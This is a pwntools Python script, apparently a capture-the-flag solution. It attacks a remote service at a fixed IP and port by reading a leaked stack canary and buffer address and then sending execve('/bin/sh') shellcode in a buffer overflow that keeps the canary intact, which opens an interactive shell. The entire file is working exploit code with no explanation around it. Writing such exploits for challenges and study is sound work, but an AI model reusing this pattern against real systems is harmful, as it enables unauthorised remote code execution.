from pwn import *
context.log_level="debug"

p = remote("3.238.30.178", 3003)

p.recvuntil("value: 0x")
canary = int(p.recv(8).ljust(8, b"\x00"),16)
info(str(hex(canary)))

p.recvuntil("at 0x")
buf = int(p.recv(8).ljust(8, b"\x00"),16)
info(str(hex(buf)))

bin = hex(u32(b"/bin"))
sh=hex(u32(b"/sh\0"))
shell = f'''
mov al,0xb
push {sh}
push {bin}
mov ebx, esp
xor ecx,ecx
xor edx,edx
int 0x80
'''
shell = asm(shell)

p.sendlineafter(": ",shell+p32(canary)+p32(buf)*(52-len(shell)))
p.interactive() 

